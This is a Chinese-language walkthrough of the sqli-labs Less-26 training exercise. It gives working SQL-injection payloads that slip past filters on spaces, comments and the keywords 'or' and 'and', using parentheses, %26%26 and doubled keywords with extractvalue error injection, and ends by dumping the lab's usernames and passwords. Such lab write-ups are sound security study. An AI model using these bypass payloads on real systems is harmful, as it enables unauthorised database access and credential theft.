## 题目: Sqli-labs Less-26

## 题目描述
页面提示 `All Your Spaces and Comments belong to us.`，这意味着传统的空格（Space）和注释符（Comments）全部被后台过滤。本关依然是字符型注入，闭合符为单引号 `'`。

## 核心原理与绕过手法
通过源码审计（或黑盒测试）可知，本关的防御极其严苛：
`preg_replace` 不仅过滤了 `or`、`and`，还过滤了 `#`、`--`、`/**/`、`\s`（所有空白字符）、`+` 和 `\`。

要想在绝境中破局，必须使用以下极限绕过姿势：
1. **无空格绕过**：利用括号 `()` 作为天然的 Token 分隔符，代替空格。例如将 `select database()` 写成 `select(database())`。
2. **关键字绕过**：使用 `%26%26`（即 `&&`）代替 `and`；双写 `infoorrmation_schema` 和 `passwoorrd` 绕开 `or` 的过滤。
3. **无注释符绕过**：由于注释符被过滤，采用对称闭合 `%26%26'1'='1` 强行补齐尾部单引号。

## 解题步骤
**1. 爆库名（⚠️ 踩坑记录：空格绕过失效）**
* **实战操作**：一开始我尝试用 `%09`（Tab）和 `/**/` 来替代空格，构造了 `?id=0'%09UNION%09SELECT...`。
* **踩坑现象**：页面直接报错 `near 'UNIONSELECT1,2,3'`。这说明后台的 `\s` 过滤极其变态，连 Tab 和 `/**/` 都被吃掉了。
* **破局**：既然联合查询走不通，我果断放弃了拼接，直接换用报错注入 `extractvalue`。
* **最终 Payload**：
```
  `?id=1'%26%26extractvalue(1,concat(0x7e,database()))%26%26'1'='1`
```
* **回显**：页面成功触发报错：`XPATH syntax error: '~security~'`。

**2. 爆表名（⚠️ 踩坑记录：`or` 被过滤）**
* **实战操作**：尝试直接查 `information_schema.tables`。
* **踩坑现象**：发现查不到数据，原因是 `information` 里的 `or` 被后台正则直接删除了，变成了 `infmation`，导致 SQL 报错。
* **破局**：使用双写绕过，将 `information` 写成 `infoorrmation`。同时，因为没有注释符，用 `()` 包裹所有查询条件，并在末尾用 `&& '1'='1` 补齐单引号。
* **最终 Payload**：
```
  `?id=1'%26%26extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))))%26%26'1'='1`
```
* **回显**：页面成功报错回显：`emails,referers,uagents,users`。

**3. 终极脱库（⚠️ 踩坑记录：`password` 被过滤）**
* **实战操作**：尝试直接查 `users` 表里的 `username` 和 `password`。
* **踩坑现象**：如果直接写 `password`，由于里面包含 `or`，会被后台吃掉变成 `passwd`，导致列名不存在。
* **破局**：必须将 `password` 双写为 `passwoorrd`，同时继续使用 `()` 替代空格。
* **最终 Payload**：
```
  `?id=1'%26%26extractvalue(1,concat(0x7e,(select(group_concat(username,0x3a,passwoorrd))from(users))))%26%26'1'='1`
```
* **回显**：成功爆出所有账号密码 `Dumb:Dumb, Angelina:I-kill-you...`。

## 知识点总结
1. **括号替代空格**：在 SQL 语句中，括号往往可以替代空格作为分隔符（如 `select(database())`），是绕过空格过滤的神器。
2. **对称闭合**：在注释符被禁用时，利用 `&& '1'='1` 或 `|| '1'='1` 强制闭合语句尾部，是极其高端的技巧。
3. **双写绕过的进阶**：不仅 `or` 和 `and` 需要双写，任何包含这些字母的关键字（如 `information`、`password`）都可能被误伤，必须时刻保持警惕。
